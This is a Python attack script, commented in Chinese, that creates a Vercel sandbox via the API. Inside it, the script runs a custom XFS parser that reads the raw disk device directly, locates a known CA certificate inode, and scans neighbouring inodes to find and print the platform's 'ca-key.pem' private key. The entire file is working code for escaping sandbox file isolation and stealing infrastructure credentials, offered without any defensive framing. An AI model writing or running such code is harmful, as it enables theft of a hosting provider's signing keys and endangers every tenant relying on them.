# 实验J133: XFS 解析器校准(inode 25166018=CA证书) + CA邻域扫描(找 ca-key.pem)
# 动机: ca-cert.pem 与 ca-key.pem 同目录部署, inode 应相邻; 用已知 CA inode 校准解析器
# 纯读操作, 零破坏
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300, args=None):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj133"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

XFS = r"""
import struct, hashlib, os, sys

f = open("/dev/vda", "rb", buffering=0)
def rd(off, n):
    f.seek(off)
    return f.read(n)

def be16(b, o): return struct.unpack_from(">H", b, o)[0]
def be32(b, o): return struct.unpack_from(">I", b, o)[0]
def be64(b, o): return struct.unpack_from(">Q", b, o)[0]

sb = rd(0, 512)
bs = be32(sb, 0x04)
dblocks = be64(sb, 0x08)
rootino = be64(sb, 0x38)
agblocks = be32(sb, 0x54)
agcount = be32(sb, 0x58)
inodesize = be16(sb, 0x68)
inopblock = be16(sb, 0x6a)
agino_per_ag = agblocks * inopblock
max_ino = agcount * agino_per_ag
print("SB bs=%d dblocks=%d agblocks=%d agcount=%d inodesize=%d inopblock=%d max_ino=%d"
      % (bs, dblocks, agblocks, agcount, inodesize, inopblock, max_ino), flush=True)

def locate_inode(ino):
    if ino >= max_ino:
        return ("OUT_OF_RANGE", None)
    agno = ino // agino_per_ag
    agino = ino % agino_per_ag
    agi = rd((agno * agblocks + 2) * bs, 512)
    if agi[:4] != b"AGIN":
        return ("AGI_BAD %r agno=%d" % (agi[:4], agno), None)
    agi_root = be32(agi, 0x14)
    agi_level = be16(agi, 0x18)
    fsb = agno * agblocks + agi_root
    for depth in range(20):
        blk = rd(fsb * bs, 512)
        bmagic = blk[:4]
        level = be16(blk, 4)
        numrecs = be16(blk, 6)
        if bmagic in (b"IAB3", b"IABT"):
            hdr = 72 if bmagic == b"IAB3" else 16
            if level > 0:
                nxt = None
                for i in range(numrecs):
                    key = be32(blk, hdr + i * 4)
                    ptr = be32(blk, hdr + numrecs * 4 + i * 4)
                    if key <= agino:
                        nxt = ptr
                if nxt is None:
                    return ("BTREE_NOMATCH", None)
                fsb = agno * agblocks + nxt
                continue
            else:
                for i in range(numrecs):
                    rec = blk[hdr + i * 16: hdr + i * 16 + 16]
                    startino = be32(rec, 0)
                    if startino <= agino < startino + 64:
                        chunk_fsb = agno * agblocks + startino // inopblock
                        ino_off = chunk_fsb * bs + (agino - startino) * inodesize
                        return ("OK", ino_off)
                return ("CHUNK_NOMATCH", None)
        else:
            return ("BAD_MAGIC %r level=%d numrecs=%d" % (bmagic, level, numrecs), None)
    return ("DEPTH_EXCEED", None)

def bmbt_decode(rec):
    l0, l1 = struct.unpack(">QQ", rec)
    startoff = l0 >> 9
    blockcount = ((l0 & 0x1FF) << 43) | (l1 >> 21)
    startblock = l1 & 0x1FFFFFFFFFFF
    return startoff, startblock, blockcount

def read_inode_file(ino, expect_size=None):
    st, ino_off = locate_inode(ino)
    if ino_off is None:
        return (st, None)
    d = rd(ino_off, inodesize)
    if d[:2] != b"IN":
        return ("BAD_IN_MAGIC %r" % d[:2], None)
    mode = be16(d, 0x02)
    size = be64(d, 0x38)
    fmt = d[0x05]
    nextents = be32(d, 0x4c)
    forkoff = d[0x52]
    out = "ino=%d off=%d mode=%o fmt=%d size=%d nextents=%d forkoff=%d" % (
        ino, ino_off, mode, fmt, size, nextents, forkoff)
    if fmt != 3 or nextents == 0 or nextents > 40:
        return (out + " (no-extents)", None)
    for dfoff in (0xa0, 0x9c, 0xb0, 0x98):
        try:
            data = b""
            ok = True
            for i in range(nextents):
                rec = d[dfoff + i * 16: dfoff + i * 16 + 16]
                if len(rec) < 16:
                    ok = False
                    break
                so, sblk, cnt = bmbt_decode(rec)
                if sblk * bs + cnt * bs > 35433480192:
                    ok = False
                    break
                data += rd(sblk * bs, cnt * bs)
            if ok and (expect_size is None or len(data) == expect_size):
                return (out + " dfoff=0x%x len=%d" % (dfoff, len(data)), data)
        except Exception:
            pass
    return (out + " (no-match dfoff)", None)

# [1] 校准: CA 证书 inode 25166018
print("\n== [1] CA cert ino=25166018 ==", flush=True)
info, data = read_inode_file(25166018)
print("INFO:", info, flush=True)
if data:
    print("MD5:", hashlib.md5(data).hexdigest(), flush=True)
    print("HEAD:", data[:120], flush=True)

# [2] CA 邻域扫描: 25165800-25166200 (找 ca-key.pem)
print("\n== [2] CA neighborhood inodes ==", flush=True)
hits = []
for ino in range(25165800, 25166201):
    st, ino_off = locate_inode(ino)
    if ino_off is None:
        continue
    d = rd(ino_off, inodesize)
    if d[:2] != b"IN":
        continue
    mode = be16(d, 0x02)
    size = be64(d, 0x38)
    fmt = d[0x05]
    if mode == 0 and size == 0:
        continue
    typ = {0o100000: "REG", 0o040000: "DIR", 0o120000: "LNK", 0o060000: "SOCK"}.get(mode & 0o170000, "?")
    line = "ino=%d %s mode=%o size=%d fmt=%d" % (ino, typ, mode, size, fmt)
    if fmt == 3 and 0 < size <= 65536:
        info2, data2 = read_inode_file(ino)
        if data2:
            line += " MD5=%s" % hashlib.md5(data2).hexdigest()[:16]
            if b"PRIVATE KEY" in data2 or b"BEGIN CERT" in data2:
                hits.append((ino, data2))
                line += " *** PEM HIT ***"
                print(line, flush=True)
                print("   CONTENT:", data2[:600], flush=True)
                continue
    print(line, flush=True)
print("NEIGHBOR_DONE hits=%d" % len(hits), flush=True)

# [3] sandbox-init ino=125832488 (预期超界, 确认)
print("\n== [3] sandbox-init ino=125832488 ==", flush=True)
info, data = read_inode_file(125832488, expect_size=16082925)
print("INFO:", info, flush=True)
if data:
    print("MD5:", hashlib.md5(data).hexdigest(), flush=True)

# [4] /etc/hosts inode (254:0 上的另一个已知文件)
print("\n== [4] stat 已知文件 ==", flush=True)
for p in ["/etc/hosts", "/etc/resolv.conf"]:
    try:
        st = os.stat(p)
        print("%-20s dev=%d:%d ino=%d size=%d" % (p, os.major(st.st_dev), os.minor(st.st_dev), st.st_ino, st.st_size), flush=True)
    except Exception as e:
        print(p, "ERR", e, flush=True)

print("XFS_DONE", flush=True)
"""
run_cmd(sid, XFS, "xfs-ca-neighbor")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
